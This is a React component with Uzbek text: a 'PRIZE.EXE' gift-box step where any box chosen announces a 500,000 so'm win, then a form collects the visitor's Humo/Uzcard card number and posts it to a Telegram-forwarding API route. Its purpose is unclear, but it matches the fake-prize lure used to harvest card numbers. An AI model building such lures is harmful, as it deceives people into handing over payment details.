'use client';

import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import confetti from 'canvas-confetti';
import { Gift, CreditCard, Sparkles, CheckCircle2, ArrowRight, Loader2 } from 'lucide-react';
import { RetroWindow } from '../RetroWindow';
import { sound } from '@/lib/sound';

interface PrizeModalProps {
  onNext: () => void;
}

export const PrizeModal: React.FC<PrizeModalProps> = ({ onNext }) => {
  const [openedBoxIndex, setOpenedBoxIndex] = useState<number | null>(null);
  const [cardNumber, setCardNumber] = useState<string>('');
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const [isSubmitted, setIsSubmitted] = useState<boolean>(false);
  const [errorMessage, setErrorMessage] = useState<string>('');

  // Format card number with spaces every 4 digits
  const handleCardInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, ''); // strip non-digits
    const truncated = raw.slice(0, 16);
    const formatted = truncated.replace(/(\d{4})(?=\d)/g, '$1 ');
    setCardNumber(formatted);
    setErrorMessage('');
  };

  const getCardType = (num: string) => {
    const clean = num.replace(/\s/g, '');
    if (clean.startsWith('8600')) return 'UZCARD';
    if (clean.startsWith('9860')) return 'HUMO';
    if (clean.length > 0) return 'KARTA';
    return '';
  };

  const handleOpenBox = (index: number) => {
    if (openedBoxIndex !== null) return;
    sound.playPop();
    sound.playSuccess();
    setOpenedBoxIndex(index);

    // Fire Confetti
    confetti({
      particleCount: 150,
      spread: 90,
      origin: { y: 0.6 },
      colors: ['#ff85a2', '#fde047', '#e9d5ff', '#ffffff'],
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const cleanNumber = cardNumber.replace(/\s/g, '');

    if (cleanNumber.length !== 16) {
      setErrorMessage("Iltimos, 16 xonali karta raqamini to'liq kiriting!");
      sound.playClick();
      return;
    }

    setIsSubmitting(true);
    sound.playClick();

    try {
      const res = await fetch('/api/send-telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ cardNumber: cleanNumber }),
      });

      const data = await res.json();

      if (res.ok && data.success) {
        sound.playSuccess();
        setIsSubmitted(true);
      } else {
        setErrorMessage(data.message || "Xatolik yuz berdi. Qayta urinib ko'ring.");
      }
    } catch {
      setErrorMessage("Tarmoq xatoligi. Iltimos qayta urinib ko'ring.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <RetroWindow title="PRIZE.EXE" stepNumber={4} totalSteps={6}>
      <div className="text-center space-y-5 max-w-xl mx-auto py-1">
        {/* Title */}
        <div className="space-y-1">
          <h2 className="text-lg sm:text-xl font-extrabold text-[#4a154b] flex items-center justify-center space-x-2">
            <Gift className="w-5 h-5 text-pink-500" />
            <span>Omadli Sovg'a Qutisi! 🎁</span>
          </h2>
          <p className="text-xs font-semibold text-[#8b3a62]">
            O'zingizga yoqqan sovg'a qutisini tanlang!
          </p>
        </div>

        {/* 3 Interactive Gift Boxes */}
        {openedBoxIndex === null ? (
          <div className="grid grid-cols-3 gap-3 py-4 max-w-md mx-auto">
            {[0, 1, 2].map((idx) => (
              <motion.button
                key={idx}
                whileHover={{ scale: 1.08, rotate: idx % 2 === 0 ? 3 : -3 }}
                whileTap={{ scale: 0.95 }}
                onClick={() => handleOpenBox(idx)}
                className="retro-box-inset p-4 bg-gradient-to-b from-[#fff0f5] to-[#ffd1dc] rounded-xl flex flex-col items-center justify-center space-y-2 border-2 border-white shadow-md hover:shadow-pink-300/50 cursor-pointer group"
              >
                <div className="w-14 h-14 bg-gradient-to-tr from-pink-400 to-rose-300 rounded-lg flex items-center justify-center border-2 border-white shadow group-hover:rotate-12 transition">
                  <Gift className="w-8 h-8 text-white drop-shadow" />
                </div>
                <span className="text-[11px] font-mono font-bold text-[#8b3a62] bg-white/80 px-2 py-0.5 rounded-full border border-pink-200">
                  QUTI #{idx + 1}
                </span>
              </motion.button>
            ))}
          </div>
        ) : (
          /* Opened Gift Prize View */
          <AnimatePresence>
            <motion.div
              initial={{ scale: 0.8, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              className="space-y-4 py-2"
            >
              {/* Prize Banner */}
              <div className="retro-box-inset bg-gradient-to-r from-amber-100 via-pink-100 to-amber-100 p-4 rounded-xl border-2 border-amber-300 shadow-md">
                <div className="flex items-center justify-center space-x-2 text-amber-600 mb-1 font-mono text-xs font-bold">
                  <Sparkles className="w-4 h-4 animate-spin" />
                  <span>YUTUQ OCHILDI!</span>
                  <Sparkles className="w-4 h-4 animate-spin" />
                </div>
                <h3 className="text-base sm:text-lg font-extrabold text-[#db2777]">
                  TABRIKLAYMIZ! Siz 500,000 SO'M pul mukofotini yutib oldingiz! 🎉
                </h3>
              </div>

              {/* Card Form */}
              {!isSubmitted ? (
                <form onSubmit={handleSubmit} className="retro-box-inset bg-white p-4 rounded-xl border-2 border-pink-200 text-left space-y-3 max-w-md mx-auto shadow-inner">
                  <div className="flex items-center justify-between">
                    <label className="text-xs font-mono font-bold text-[#8b3a62] flex items-center space-x-1.5">
                      <CreditCard className="w-4 h-4 text-pink-500" />
                      <span>Karta raqamingiz (Humo / Uzcard):</span>
                    </label>
                    {getCardType(cardNumber) && (
                      <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-pink-100 text-pink-700 border border-pink-300">
                        {getCardType(cardNumber)}
                      </span>
                    )}
                  </div>

                  <div className="relative">
                    <input
                      type="text"
                      value={cardNumber}
                      onChange={handleCardInput}
                      placeholder="8600 0000 0000 0000"
                      className="w-full px-3 py-2 border-2 border-pink-300 rounded font-mono text-sm sm:text-base tracking-wider text-[#4a154b] focus:outline-none focus:border-pink-500 bg-[#fff5f8]"
                      maxLength={19}
                    />
                  </div>

                  {errorMessage && (
                    <p className="text-xs text-red-500 font-semibold font-mono">
                      ⚠️ {errorMessage}
                    </p>
                  )}

                  <button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full retro-button py-2.5 font-mono font-bold text-xs sm:text-sm text-[#db2777] flex items-center justify-center space-x-2"
                  >
                    {isSubmitting ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin text-pink-600" />
                        <span>Jo'natilmoqda...</span>
                      </>
                    ) : (
                      <>
                        <span>YUTUQNI OLISH</span>
                        <CreditCard className="w-4 h-4" />
                      </>
                    )}
                  </button>
                </form>
              ) : (
                /* Success Notification Toast */
                <motion.div
                  initial={{ scale: 0.9, opacity: 0 }}
                  animate={{ scale: 1, opacity: 1 }}
                  className="bg-emerald-50 border-2 border-emerald-300 p-4 rounded-xl text-center space-y-2 max-w-md mx-auto shadow-sm"
                >
                  <div className="flex items-center justify-center space-x-2 text-emerald-600 font-bold text-sm">
                    <CheckCircle2 className="w-5 h-5 text-emerald-500" />
                    <span>Muvaffaqiyatli jo'natildi!</span>
                  </div>
                  <p className="text-xs text-emerald-800 font-medium">
                    Yutuq so'rovi qabul qilindi! Pul tez orada kartangizga o'tkaziladi ✨
                  </p>
                </motion.div>
              )}
            </motion.div>
          </AnimatePresence>
        )}

        {/* Next Button */}
        <div className="pt-2">
          <button
            onClick={() => {
              sound.playClick();
              onNext();
            }}
            className="retro-button px-6 py-2.5 font-mono font-bold text-xs sm:text-sm text-[#db2777] hover:text-pink-700 flex items-center space-x-2 mx-auto"
          >
            <span>KEYINGISI</span>
            <ArrowRight className="w-4 h-4 text-pink-600" />
          </button>
        </div>
      </div>
    </RetroWindow>
  );
};
